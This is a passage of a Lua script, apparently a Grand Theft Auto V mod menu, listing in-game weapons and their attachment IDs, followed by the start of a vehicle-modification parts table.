            name = '~h~~p~> ~s~Carbine Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Box Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        CarbineRifleMkII = {
            id = 'weapon_carbinerifle_mk2',
            name = '~h~~p~> ~s~Carbine Rifle Mk II ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Tracer Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~> ~s~FMJ Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~p~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~> ~s~Default',
                        id = 'COMPONENT_AT_CR_BARREL_01'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy',
                        id = 'COMPONENT_AT_CR_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~p~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        AdvancedRifle = {
            id = 'weapon_advancedrifle',
            name = '~h~~p~> ~s~Advanced Rifle ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                }
            }
        },
        SpecialCarbine = {
            id = 'weapon_specialcarbine',
            name = '~h~~p~> ~s~Special Carbine',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Drum Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        SpecialCarbineMkII = {
            id = 'weapon_specialcarbine_mk2',
            name = '~h~~p~> ~s~Special Carbine Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Tracer Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~> ~s~FMJ Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~p~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~> ~s~Default',
                        id = 'COMPONENT_AT_SC_BARREL_01'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy',
                        id = 'COMPONENT_AT_SC_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        BullpupRifle = {
            id = 'weapon_bullpuprifle',
            name = '~h~~p~> ~s~Bullpup Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        BullpupRifleMkII = {
            id = 'weapon_bullpuprifle_mk2',
            name = '~h~~p~> ~s~Bullpup Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Tracer Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~> ~s~Armor Piercing Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~> ~s~FMJ Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02_MK2'
                    },
                    {
                        name = '~h~~p~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~> ~s~Default',
                        id = 'COMPONENT_AT_BP_BARREL_01'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy',
                        id = 'COMPONENT_AT_BP_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~p~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        CompactRifle = {
            id = 'weapon_compactrifle',
            name = '~h~~p~> ~s~Compact Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Drum Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_03'
                    }
                }
            }
        }
    },
    LMG = {
        MG = {
            id = 'weapon_mg',
            name = '~h~~p~> ~s~MG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_MG_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_MG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_02'
                    }
                }
            }
        },
        CombatMG = {
            id = 'weapon_combatmg',
            name = '~h~~p~> ~s~Combat MG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATMG_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        CombatMGMkII = {
            id = 'weapon_combatmg_mk2',
            name = '~h~~p~> ~s~Combat MG Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Tracer Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~> ~s~FMJ Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    },
                    {
                        name = '~h~~p~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~> ~s~Default',
                        id = 'COMPONENT_AT_MG_BARREL_01'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy',
                        id = 'COMPONENT_AT_MG_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        GusenbergSweeper = {
            id = 'weapon_gusenberg',
            name = '~h~~p~> ~s~GusenbergSweeper',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_GUSENBERG_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_GUSENBERG_CLIP_02'
                    }
                }
            }
        }
    },
    Snipers = {
        SniperRifle = {
            id = 'weapon_sniperrifle',
            name = '~h~~p~> ~s~Sniper Rifle',
            bInfAmmo = false,
            mods = {
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE'
                    },
                    {
                        name = '~h~~p~> ~s~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        HeavySniper = {
            id = 'weapon_heavysniper',
            name = '~h~~p~> ~s~Heavy Sniper',
            bInfAmmo = false,
            mods = {
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE'
                    },
                    {
                        name = '~h~~p~> ~s~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    }
                }
            }
        },
        HeavySniperMkII = {
            id = 'weapon_heavysniper_mk2',
            name = '~h~~p~> ~s~Heavy Sniper Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~> ~s~Armor Piercing Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~> ~s~FMJ Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ'
                    },
                    {
                        name = '~h~~p~> ~s~Explosive Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Zoom Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_MK2'
                    },
                    {
                        name = '~h~~p~> ~s~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    },
                    {
                        name = '~h~~p~> ~s~Nigt Vision Scope',
                        id = 'COMPONENT_AT_SCOPE_NV'
                    },
                    {
                        name = '~h~~p~> ~s~Thermal Scope',
                        id = 'COMPONENT_AT_SCOPE_THERMAL'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~> ~s~Default',
                        id = 'COMPONENT_AT_SR_BARREL_01'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy',
                        id = 'COMPONENT_AT_SR_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP_03'
                    },
                    {
                        name = '~h~~p~> ~s~Squared Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_08'
                    },
                    {
                        name = '~h~~p~> ~s~Bell-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_09'
                    }
                }
            }
        },
        MarksmanRifle = {
            id = 'weapon_marksmanrifle',
            name = '~h~~p~> ~s~Marksman Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        MarksmanRifleMkII = {
            id = 'weapon_marksmanrifle_mk2',
            name = '~h~~p~> ~s~Marksman Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Tracer Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~> ~s~FMJ Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    },
                    {
                        name = '~h~~p~> ~s~Zoom Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~> ~s~Default',
                        id = 'COMPONENT_AT_MRFL_BARREL_01'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy',
                        id = 'COMPONENT_AT_MRFL_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~p~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        }
    },
    Heavy = {
        RPG = {
            id = 'weapon_rpg',
            name = '~h~~p~> ~s~RPG',
            bInfAmmo = false,
            mods = {}
        },
        GrenadeLauncher = {
            id = 'weapon_grenadelauncher',
            name = '~h~~p~> ~s~Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        GrenadeLauncherSmoke = {
            id = 'weapon_grenadelauncher_smoke',
            name = '~h~~p~> ~s~Grenade Launcher Smoke',
            bInfAmmo = false,
            mods = {}
        },
        Minigun = {
            id = 'weapon_minigun',
            name = '~h~~p~> ~s~Minigun',
            bInfAmmo = false,
            mods = {}
        },
        FireworkLauncher = {
            id = 'weapon_firework',
            name = '~h~~p~> ~s~Firework Launcher',
            bInfAmmo = false,
            mods = {}
        },
        Railgun = {
            id = 'weapon_railgun',
            name = '~h~~p~> ~s~Railgun',
            bInfAmmo = false,
            mods = {}
        },
        HomingLauncher = {
            id = 'weapon_hominglauncher',
            name = '~h~~p~> ~s~Homing Launcher',
            bInfAmmo = false,
            mods = {}
        },
        CompactGrenadeLauncher = {
            id = 'weapon_compactlauncher',
            name = '~h~~p~> ~s~Compact Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        Widowmaker = {
            id = 'weapon_rayminigun',
            name = '~h~~p~> ~s~Widowmaker',
            bInfAmmo = false,
            mods = {}
        }
    },
    Throwables = {
        Grenade = {
            id = 'weapon_grenade',
            name = '~h~~p~> ~s~Grenade',
            bInfAmmo = false,
            mods = {}
        },
        BZGas = {
            id = 'weapon_bzgas',
            name = '~h~~p~> ~s~BZ Gas',
            bInfAmmo = false,
            mods = {}
        },
        MolotovCocktail = {
            id = 'weapon_molotov',
            name = '~h~~p~> ~s~Molotov Cocktail',
            bInfAmmo = false,
            mods = {}
        },
        StickyBomb = {
            id = 'weapon_stickybomb',
            name = '~h~~p~> ~s~Sticky Bomb',
            bInfAmmo = false,
            mods = {}
        },
        ProximityMines = {
            id = 'weapon_proxmine',
            name = '~h~~p~> ~s~Proximity Mines',
            bInfAmmo = false,
            mods = {}
        },
        Snowballs = {
            id = 'weapon_snowball',
            name = '~h~~p~> ~s~Snowballs',
            bInfAmmo = false,
            mods = {}
        },
        PipeBombs = {
            id = 'weapon_pipebomb',
            name = '~h~~p~> ~s~Pipe Bombs',
            bInfAmmo = false,
            mods = {}
        },
        Baseball = {
            id = 'weapon_ball',
            name = '~h~~p~> ~s~Baseball',
            bInfAmmo = false,
            mods = {}
        },
        TearGas = {
            id = 'weapon_smokegrenade',
            name = '~h~~p~> ~s~Tear Gas',
            bInfAmmo = false,
            mods = {}
        },
        Flare = {
            id = 'weapon_flare',
            name = '~h~~p~> ~s~Flare',
            bInfAmmo = false,
            mods = {}
        }
    },
    Misc = {
        Parachute = {
            id = 'gadget_parachute',
            name = '~h~~p~> ~s~Parachute',
            bInfAmmo = false,
            mods = {}
        },
        FireExtinguisher = {
            id = 'weapon_fireextinguisher',
            name = '~h~~p~> ~s~Fire Extinguisher',
            bInfAmmo = false,
            mods = {}
        }
    }
}
local b8 = false
local b9 = false
local ba = false
local bb = false
local bc = nil
local bd = {}
local be = {}
local bf = nil
local bg = false
local bh = -1
local bi = -1
local bj = -1
local bk = false
local bl = {
    {
        name = '~h~Spoilers',
        id = 0
    },
    {
        name = '~h~Front Bumper',
        id = 1
    },
    {
        name = '~h~Rear Bumper',
        id = 2
    },
    {
        name = '~h~Side Skirt',
        id = 3
    },
    {
        name = '~h~Exhaust',
        id = 4
    },
    {
        name = '~h~Frame',
        id = 5
    },
    {
        name = '~h~Grille',
        id = 6
    },
    {
        name = '~h~Hood',
        id = 7
    },
    {
        name = '~h~Fender',
        id = 8
    },
    {
        name = '~h~Right Fender',
        id = 9
    },
    {
        name = '~h~Roof',
        id = 10
    },
    {
        name = '~h~Vanity Plates',
        id = 25
    },
    {
        name = '~h~Trim',
        id = 27
    },
    {
        name = '~h~Ornaments',
        id = 28
    },
    {
        name = '~h~Dashboard',
        id = 29
    },
    {
        name = '~h~Dial',
        id = 30
    },
    {
        name = '~h~Door Speaker',
        id = 31
    },
    {
        name = '~h~Seats',
        id = 32
    },
    {
        name = '~h~Steering Wheel',
        id = 33
    },
    {
        name = '~h~Shifter Leavers',
        id = 34
    },
    {
        name = '~h~Plaques',
        id = 35
    },
    {
        name = '~h~Speakers',
        id = 36
    },
    {
        name = '~h~Trunk',
        id = 37
    },
    {
        name = '~h~Hydraulics',
        id = 38
    },
    {
        name = '~h~Engine Block',
        id = 39
    },
    {
        name = '~h~Air Filter',
        id = 40
    },
    {
        name = '~h~Struts',
        id = 41
    },
    {
